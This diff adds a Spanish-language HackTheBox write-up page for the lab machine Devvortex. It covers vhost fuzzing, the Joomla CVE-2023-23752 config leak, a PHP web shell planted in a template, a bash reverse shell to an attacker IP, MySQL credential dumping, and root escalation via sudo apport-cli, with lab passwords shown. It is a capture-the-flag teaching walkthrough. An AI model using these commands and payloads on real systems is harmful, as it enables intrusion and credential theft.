@@ -1,0 +1,132 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Devvortex HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/devvortex/pasted-20260407023927.png" alt="Devvortex HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Devvortex</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>joomla</span>
+            <span>vhosts</span>
+            <span>mysql</span>
+            <span>sudoers</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Fuzzing de vhosts para descubrir Joomla en <code>dev.devvortex.htb</code></li>
+            <li><code>Explotación</code>: CVE-2023-23752 permite leer configuración y acceder al panel de Joomla</li>
+            <li><code>Movimiento lateral</code>: Base de datos MySQL expone credenciales de <code>logan</code></li>
+            <li><code>Escalada de Privilegios</code>: Sudoers sobre <code>apport-cli</code> para obtener shell como root</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407150832.png" alt="Devvortex HTB" />
+          <div class="code-card">
+            <h3>Enumerar subdominios</h3>
+            <pre><code>gobuster vhost -u http://10.129.229.146 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --domain devvortex.htb --append-domain</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407152354.png" alt="Devvortex HTB" />
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407164902.png" alt="Devvortex HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Joomla</h2>
+          <div class="code-card">
+            <h3>Lanzamos joomscan</h3>
+            <pre><code>joomscan --url http://dev.devvortex.htb</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407165000.png" alt="Devvortex HTB" />
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407165046.png" alt="Devvortex HTB" />
+          <p><a href="https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT/blob/main/CVE-2023-23752.py">Exploit</a></p>
+          <div class="code-card">
+            <h3>Exploit </h3>
+            <pre><code>python3 CVE-2023-23752.py -u http://dev.devvortex.htb
+# Explota esta API: http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
+# Credenciales Web -&gt; lewis:P4ntherg0t1n5r3c0n##</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407165202.png" alt="Devvortex HTB" />
+          <div class="code-card">
+            <h3>Accedemos a Joomla</h3>
+            <pre><code># Buscar templates y modificar error.php para ganar acceso al sistema</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407165332.png" alt="Devvortex HTB" />
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407171603.png" alt="Devvortex HTB" />
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407171756.png" alt="Devvortex HTB" />
+          <div class="code-card">
+            <h3>Sustituir comando echo por system y RCE</h3>
+            <pre><code>system($_GET['cmd']);
+# URL: http://dev.devvortex.htb/administrator/index.php?cmd=whoami</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407171856.png" alt="Devvortex HTB" />
+          <div class="code-card">
+            <h3>Reverse shell</h3>
+            <pre><code># Listener 443
+# RCE: http://dev.devvortex.htb/administrator/index.php?cmd=bash -c "bash -i &gt;%26 /dev/tcp/10.10.16.178/443 0&gt;%261"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407173055.png" alt="Devvortex HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: BD</h2>
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407173402.png" alt="Devvortex HTB" />
+          <div class="code-card">
+            <h3>MySQL</h3>
+            <pre><code>MySQL -u lewis -p
+# Credenciales MySQL -&gt; lewis:P4ntherg0t1n5r3c0n##
+# DB joomla
+show databases;
+use joomla;
+select * from sd4fg_users;
+# Credenciales -&gt; logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
+# Credenciales -&gt; logan:tequieromucho</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407173622.png" alt="Devvortex HTB" />
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407173838.png" alt="Devvortex HTB" />
+          <div class="code-card">
+            <h3>SSH</h3>
+            <pre><code>ssh logan@10.129.229.146
+# Password: tequieromucho</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Sudoer</h2>
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407174634.png" alt="Devvortex HTB" />
+          <div class="code-card">
+            <h3>Escalada</h3>
+            <pre><code>sudo /usr/bin/apport-cli -f
+# 1
+# 2
+# V
+# !/bin/sh</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/devvortex/pasted-20260407200742.png" alt="Devvortex HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>joomla</span>
+            <span>vhosts</span>
+            <span>mysql</span>
+            <span>sudoers</span>
+            <span>apport-cli</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
